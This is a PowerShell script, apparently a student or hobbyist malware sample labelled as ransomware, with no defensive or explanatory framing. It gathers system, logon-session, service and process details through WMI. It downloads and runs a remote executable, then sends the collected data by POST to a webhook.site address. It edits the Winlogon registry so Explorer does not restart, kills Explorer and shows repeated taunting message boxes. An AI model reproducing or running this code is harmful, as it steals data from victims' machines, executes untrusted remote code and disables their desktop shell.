function Add-Zip
{
  param([string]$zipfilename)

  if(!$zipfilename.Contains("\"))
  {
    $zipfilename = ".\" + $zipfilename
  }

  if(-not (test-path($zipfilename)))
  {
    set-content $zipfilename ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
    (dir $zipfilename).IsReadOnly = $false  
  }

  $zipfilename = (Get-Item $zipfilename).FullName
  
  $shellApplication = new-object -com shell.application
  $zipPackage = $shellApplication.NameSpace($zipfilename)
  
  foreach($file in $input) 
  { 
            $zipPackage.CopyHere($file.FullName)
            Start-sleep -milliseconds 500
            #Remove-Item -Path $file -Recurse
  }
}

$win32_Desktop = Get-WmiObject Win32_Desktop
$win32_BIOS = Get-WmiObject Win32_BIOS
$win32_Processor = Get-WmiObject Win32_Processor
$win32_ComputerSystem = Get-WmiObject Win32_ComputerSystem
$win32_OperatingSystem = Get-WmiObject Win32_OperatingSystem
$win32_LogonSession = Get-WmiObject Win32_LogonSession
$win32_Service = Get-WmiObject Win32_Service
$process_list = Get-Process
$UserPath = "$($env:USERPROFILE)\Desktop\CheckDisk.txt"

$result = "[+]win32_Desktop`r`n$win32_Desktop`r`n`r`n"
$result += "[+]win32_BIOS`r`n$win32_BIOS `r`n`r`n"
$result += "[+]win32_Processor`r`n$win32_Processor `r`n`r`n"
$result += "[+]win32_ComputerSystem`r`n$win32_ComputerSystem `r`n`r`n"
$result += "[+]win32_OperatingSystem`r`n$win32_OperatingSystem `r`n`r`n"
$result += "[+]win32_LogonSession`r`n$win32_LogonSession `r`n`r`n"
$result += "[+]win32_Service`r`n$win32_Service `r`n`r`n"
$result += "[+]process_list`r`n$process_list`r`n`r`n"

Write-Host $result

(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/esby97/dakuo_powershell/master/SetWallpaper.exe', 'C:\merong.exe');
(New-Object System.Net.WebClient).DownloadFile('http://pds21.egloos.com/pds/201104/07/37/c0001937_4d9dc561e2556.jpg', 'C:\ani.jpg');
Start-Process "C:\merong.exe" "C:\ani.jpg"
Start-sleep -milliseconds 500
$UserPath | Add-Zip RANSOMEWARE.zip
Remove-Item -Path "C:\ani.jpg"
Remove-Item -Path "C:\merong.exe"

$uri = "http://webhook.site/d18dc949-ce71-4377-876a-6706b3f13d87"
$uploadPath = "C:\RANSOMEWARE.zip"

$request = [System.Net.WebRequest]::Create($uri)
$request.ContentType = "application/text"
$request.Method = "POST"
$body = "result=$result"
 
try
{
    $requestStream = $request.GetRequestStream()
    $streamWriter = New-Object System.IO.StreamWriter($requestStream)
    $streamWriter.Write($body)
}

finally
{
    if ($null -ne $streamWriter) { $streamWriter.Dispose() }
    if ($null -ne $requestStream) { $requestStream.Dispose() }
}

$res = $request.GetResponse()

Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoRestartShell -Value 0
Stop-Process -ProcessName explorer -Force
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show('DAKUO IS GOD!!!!!!!')
[System.Windows.Forms.MessageBox]::Show('DAKUO IS GOD!!!!!!!')
[System.Windows.Forms.MessageBox]::Show('DAKUO IS GOD!!!!!!!')
[System.Windows.Forms.MessageBox]::Show('DAKUO IS GOD!!!!!!!')
[System.Windows.Forms.MessageBox]::Show('DAKUO IS GOD!!!!!!!')
